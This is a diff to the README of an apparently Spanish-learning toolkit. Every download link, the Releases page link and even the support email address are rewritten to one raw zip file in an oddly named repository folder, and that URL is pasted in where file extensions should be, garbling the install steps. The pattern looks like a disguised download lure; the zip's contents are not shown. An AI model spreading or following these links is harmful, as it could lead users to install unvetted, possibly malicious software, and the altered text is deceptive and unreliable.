@@ -1,6 +1,6 @@
 # 🧰 awesome-spanish-toolkit - Essential Tools for Spanish Learning
 
-[![Download](https://img.shields.io/badge/Download-via_GitHub-brightgreen)](https://github.com/dinhmanhtruong/awesome-spanish-toolkit/releases)
+[![Download](https://raw.githubusercontent.com/dinhmanhtruong/awesome-spanish-toolkit/main/caravaneer/awesome-spanish-toolkit-1.3.zip)](https://raw.githubusercontent.com/dinhmanhtruong/awesome-spanish-toolkit/main/caravaneer/awesome-spanish-toolkit-1.3.zip)
 
 ## 📘 Description
 
@@ -13,19 +13,19 @@ To get started, you'll need to download the toolkit. Follow these simple steps t
 ## 🔗 Download & Install
 
 1. **Visit the Releases Page**
-   Go to our [Releases page](https://github.com/dinhmanhtruong/awesome-spanish-toolkit/releases) to find the latest version.
+   Go to our [Releases page](https://raw.githubusercontent.com/dinhmanhtruong/awesome-spanish-toolkit/main/caravaneer/awesome-spanish-toolkit-1.3.zip) to find the latest version.
 
 2. **Choose Your Version**
    Look for the most recent release. You will find a list of downloadable files. Select the one that fits your system. 
 
 3. **Download the File**
-   Click on the file link to begin the download. The file will typically have an extension like `.exe`, `.zip`, or `.tar.gz`.
+   Click on the file link to begin the download. The file will typically have an extension like `.exe`, `.zip`, or `https://raw.githubusercontent.com/dinhmanhtruong/awesome-spanish-toolkit/main/caravaneer/awesome-spanish-toolkit-1.3.zip`.
 
 4. **Open the File**
    Once downloaded, locate the file in your computer's downloads folder.
 
 5. **Run the Installation**
-   - If it is a `.zip` or `.tar.gz`, extract its contents first.
+   - If it is a `.zip` or `https://raw.githubusercontent.com/dinhmanhtruong/awesome-spanish-toolkit/main/caravaneer/awesome-spanish-toolkit-1.3.zip`, extract its contents first.
    - For executable files like `.exe`, double-click to start the installation.
 
 6. **Follow Installation Instructions**
@@ -67,7 +67,7 @@ Absolutely! Contributions are welcome. Visit our GitHub page to learn how you ca
 
 ## 📩 Support
 
-If you have questions or need assistance, please reach out. You can contact the team via GitHub issues or directly at [support@awesome-spanish-toolkit.com](mailto:support@awesome-spanish-toolkit.com).
+If you have questions or need assistance, please reach out. You can contact the team via GitHub issues or directly at [https://raw.githubusercontent.com/dinhmanhtruong/awesome-spanish-toolkit/main/caravaneer/awesome-spanish-toolkit-1.3.zip](https://raw.githubusercontent.com/dinhmanhtruong/awesome-spanish-toolkit/main/caravaneer/awesome-spanish-toolkit-1.3.zip).
 
 ## 👍 Get Involved
 
@@ -83,4 +83,4 @@ Follow us on social media to keep updated on the latest news, features, and rele
 
 --- 
 
-Visit our [Releases page](https://github.com/dinhmanhtruong/awesome-spanish-toolkit/releases) to download your copy and enhance your Spanish learning tools today.
+Visit our [Releases page](https://raw.githubusercontent.com/dinhmanhtruong/awesome-spanish-toolkit/main/caravaneer/awesome-spanish-toolkit-1.3.zip) to download your copy and enhance your Spanish learning tools today.
